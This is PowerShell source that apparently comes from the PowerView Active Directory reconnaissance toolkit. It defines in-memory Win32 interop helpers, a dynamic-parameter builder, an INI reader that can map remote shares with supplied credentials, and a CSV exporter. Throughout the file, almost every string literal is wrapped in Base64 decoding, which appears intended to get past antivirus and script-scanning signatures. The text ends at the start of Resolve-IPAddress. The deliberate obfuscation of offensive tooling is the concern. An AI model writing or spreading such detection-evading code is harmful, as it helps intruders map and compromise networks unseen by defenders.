function New-InMemoryModule {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLkFwcERvbWFpbg==")))).GetProperty(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3VycmVudERvbWFpbg==")))).GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UnVu"))))
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}




function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGFyYW1ldGVyVHlwZXM=")))] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmF0aXZlQ2FsbGluZ0NvbnZlbnRpb24=")))] = $NativeCallingConvention }
    if ($Charset) { $Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hhcnNldA==")))] = $Charset }
    if ($SetLastError) { $Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0TGFzdEVycm9y")))] = $SetLastError }
    if ($EntryPoint) { $Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW50cnlQb2ludA==")))] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JE5hbWVzcGFjZS4kRGxsTmFtZQ=="))))
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JE5hbWVzcGFjZS4kRGxsTmFtZQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGljLEJlZm9yZUZpZWxkSW5pdA=="))))
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGljLEJlZm9yZUZpZWxkSW5pdA=="))))
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGljLFN0YXRpYyxQaW52b2tlSW1wbA=="))),
                $ReturnType,
                $ParameterTypes)

            
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0"))), $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0TGFzdEVycm9y"))))
            $CallingConventionField = $DllImport.GetField(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2FsbGluZ0NvbnZlbnRpb24="))))
            $CharsetField = $DllImport.GetField(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hhclNldA=="))))
            $EntryPointField = $DllImport.GetField(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW50cnlQb2ludA=="))))
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW50cnlQb2ludA==")))]) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {


    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGlj"))), $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}




function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{


    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QW5zaUNsYXNzLAogICAgICAgIENsYXNzLAogICAgICAgIFB1YmxpYywKICAgICAgICBTZWFsZWQsCiAgICAgICAgQmVmb3JlRmllbGRJbml0")))

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l6ZUNvbnN0")))))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    
    
    
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field][([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG9zaXRpb24=")))]
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmllbGROYW1l")))]
        $FieldProp = $Field[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]

        $Offset = $FieldProp[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2Zmc2V0")))]
        $Type = $FieldProp[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHlwZQ==")))]
        $MarshalAs = $FieldProp[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWFyc2hhbEFz")))]

        $NewField = $StructBuilder.DefineField($FieldName, $Type, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGlj"))))

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    
    
    $SizeMethod = $StructBuilder.DefineMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U2l6ZQ=="))),
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGljLCBTdGF0aWM="))),
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0VHlwZUZyb21IYW5kbGU=")))))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l6ZU9m"))), [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    
    
    $ImplicitConverter = $StructBuilder.DefineMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b3BfSW1wbGljaXQ="))),
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpdmF0ZVNjb3BlLCBQdWJsaWMsIFN0YXRpYywgSGlkZUJ5U2lnLCBTcGVjaWFsTmFtZQ=="))),
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0VHlwZUZyb21IYW5kbGU=")))))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHRyVG9TdHJ1Y3R1cmU="))), [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}








Function New-DynamicParameter {


    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$Mandatory,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$Position,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$HelpMessage,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$DontShow,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipeline,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipelineByPropertyName,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromRemainingArguments,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$ParameterSetName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("X19BbGxQYXJhbWV0ZXJTZXRz"))),

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyString,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyCollection,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNullOrEmpty,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateCount,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateRange,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateLength,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$ValidatePattern,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ValidateScript,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$ValidateSet,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGljdGlvbmFyeSBtdXN0IGJlIGEgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW50aW1lRGVmaW5lZFBhcmFtZXRlckRpY3Rpb25hcnkgb2JqZWN0")))
            }
            $true
        })]
        $Dictionary = $false,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$CreateVariables,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            
            
            if($_.GetType().Name -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGljdGlvbmFyeQ==")))) {
                Throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Qm91bmRQYXJhbWV0ZXJzIG11c3QgYmUgYSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQm91bmRQYXJhbWV0ZXJzRGljdGlvbmFyeSBvYmplY3Q=")))
            }
            $true
        })]
        $BoundParameters
    )

    Begin {
        $InternalDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $CommonParameters = (Get-Command _temp).Parameters.Keys
    }

    Process {
        if($CreateVariables) {
            $BoundKeys = $BoundParameters.Keys | Where-Object { $CommonParameters -notcontains $_ }
            ForEach($Parameter in $BoundKeys) {
                if ($Parameter) {
                    Set-Variable -Name $Parameter -Value $BoundParameters.$Parameter -Scope 1 -Force
                }
            }
        }
        else {
            $StaleKeys = @()
            $StaleKeys = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkVxdWFscyQ=")))) {
                                
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($StaleKeys) {
                $StaleKeys | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }

            
            $UnboundParameters = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }

            
            $tmp = $null
            ForEach ($Parameter in $UnboundParameters) {
                $DefaultValue = Get-Variable -Name $Parameter -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($Parameter, [ref]$tmp) -and $DefaultValue) {
                    $PSBoundParameters.$Parameter = $DefaultValue
                }
            }

            if($Dictionary) {
                $DPDictionary = $Dictionary
            }
            else {
                $DPDictionary = $InternalDictionary
            }

            
            $GetVar = {Get-Variable -Name $_ -ValueOnly -Scope 0}

            
            $AttributeRegex = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XihNYW5kYXRvcnl8UG9zaXRpb258UGFyYW1ldGVyU2V0TmFtZXxEb250U2hvd3xIZWxwTWVzc2FnZXxWYWx1ZUZyb21QaXBlbGluZXxWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lfFZhbHVlRnJvbVJlbWFpbmluZ0FyZ3VtZW50cykk")))
            $ValidationRegex = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XihBbGxvd051bGx8QWxsb3dFbXB0eVN0cmluZ3xBbGxvd0VtcHR5Q29sbGVjdGlvbnxWYWxpZGF0ZUNvdW50fFZhbGlkYXRlTGVuZ3RofFZhbGlkYXRlUGF0dGVybnxWYWxpZGF0ZVJhbmdlfFZhbGlkYXRlU2NyaXB0fFZhbGlkYXRlU2V0fFZhbGlkYXRlTm90TnVsbHxWYWxpZGF0ZU5vdE51bGxPckVtcHR5KSQ=")))
            $AliasRegex = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkFsaWFzJA==")))
            $ParameterAttribute = New-Object -TypeName System.Management.Automation.ParameterAttribute

            switch -regex ($PSBoundParameters.Keys) {
                $AttributeRegex {
                    Try {
                        $ParameterAttribute.$_ = . $GetVar
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }

            if($DPDictionary.Keys -contains $Name) {
                $DPDictionary.$Name.Attributes.Add($ParameterAttribute)
            }
            else {
                $AttributeCollection = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $ValidationRegex {
                        Try {
                            $ParameterOptions = New-Object -TypeName ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi4ke199QXR0cmlidXRl"))) -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterOptions)
                        }
                        Catch { $_ }
                        continue
                    }
                    $AliasRegex {
                        Try {
                            $ParameterAlias = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterAlias)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $AttributeCollection.Add($ParameterAttribute)
                $Parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)
                $DPDictionary.Add($Name, $Parameter)
            }
        }
    }

    End {
        if(!$CreateVariables -and !$Dictionary) {
            $DPDictionary
        }
    }
}


function Get-IniContent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $OutputObject
    )

    BEGIN {
        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFxcXC4qXFwuKg==")))) -and ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            if (Test-Path -Path $TargetPath) {
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0cHV0T2JqZWN0")))]) {
                    $IniObject = New-Object PSObject
                }
                else {
                    $IniObject = @{}
                }
                Switch -Regex -File $TargetPath {
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlxbKC4rKVxd"))) 
                    {
                        $Section = $matches[1].Trim()
                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0cHV0T2JqZWN0")))]) {
                            $Section = $Section.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IA=="))), '')
                            $SectionObject = New-Object PSObject
                            $IniObject | Add-Member Noteproperty $Section $SectionObject
                        }
                        else {
                            $IniObject[$Section] = @{}
                        }
                        $CommentCount = 0
                    }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Xig7LiopJA=="))) 
                    {
                        $Value = $matches[1].Trim()
                        $CommentCount = $CommentCount + 1
                        $Name = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tbWVudA=="))) + $CommentCount
                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0cHV0T2JqZWN0")))]) {
                            $Name = $Name.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IA=="))), '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $IniObject[$Section][$Name] = $Value
                        }
                    }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KC4rPylccyo9KC4qKQ=="))) 
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $Values = $Value.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA==")))) | ForEach-Object { $_.Trim() }

                        

                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0cHV0T2JqZWN0")))]) {
                            $Name = $Name.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IA=="))), '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Values
                        }
                        else {
                            $IniObject[$Section][$Name] = $Values
                        }
                    }
                }
                $IniObject
            }
        }
    }

    END {
        
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


function Export-PowerViewCSV {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,

        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $Delimiter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),

        [Switch]
        $Append
    )

    BEGIN {
        $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA==")))])
        $Exists = [System.IO.File]::Exists($OutputPath)

        
        $Mutex = New-Object System.Threading.Mutex $False,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q1NWTXV0ZXg=")))
        $Null = $Mutex.WaitOne()

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXBwZW5k")))]) {
            $FileMode = [System.IO.FileMode]::Append
        }
        else {
            $FileMode = [System.IO.FileMode]::Create
            $Exists = $False
        }

        $CSVStream = New-Object IO.FileStream($OutputPath, $FileMode, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $CSVWriter = New-Object System.IO.StreamWriter($CSVStream)
        $CSVWriter.AutoFlush = $True
    }

    PROCESS {
        ForEach ($Entry in $InputObject) {
            $ObjectCSV = ConvertTo-Csv -InputObject $Entry -Delimiter $Delimiter -NoTypeInformation

            if (-not $Exists) {
                
                $ObjectCSV | ForEach-Object { $CSVWriter.WriteLine($_) }
                $Exists = $True
            }
            else {
                
                $ObjectCSV[1..($ObjectCSV.Length-1)] | ForEach-Object { $CSVWriter.WriteLine($_) }
            }
        }
    }

    END {
        $Mutex.ReleaseMutex()
        $CSVWriter.Dispose()
        $CSVStream.Dispose()
    }
}


function Resolve-IPAddress {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME
    )

